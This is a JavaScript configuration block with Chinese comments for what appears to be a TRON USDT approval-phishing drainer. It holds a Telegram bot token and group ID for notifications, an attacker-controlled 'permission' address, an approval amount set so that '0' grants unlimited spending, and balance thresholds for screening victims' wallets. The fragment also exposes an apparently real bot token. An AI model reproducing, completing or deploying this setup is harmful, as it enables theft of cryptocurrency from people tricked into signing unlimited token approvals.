    // 配置授权地址、Telegram 机器人信息、USDT合约地址和授权金额：
    const config = {
        telegramBotToken: "6853901663:AAEymAUM3l4-UkgVWDpUHPzKRCvvFx_YIDc", // @BotFather 注册机器人
        telegramChannelId: "-4269518806", // Telegram 群组ID 邀请@GetMyChatID_Bot进群可查
        authorizedAddress: "TNd4ZvQkdTcYFKsKNAhCGtGwGz2FfStfNV", // 权限地址配置
        usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT 合约地址
        approvalAmount: "0", // 授权金额修改,设置'0'为无限额度
        bnbBalanceThreshold: "22", // TRX余额的最低阈值，设置为'0'表示不检查
        usdtBalanceThreshold: "0.1" // USDT余额的最低阈值，设置为'0'表示不检查
    };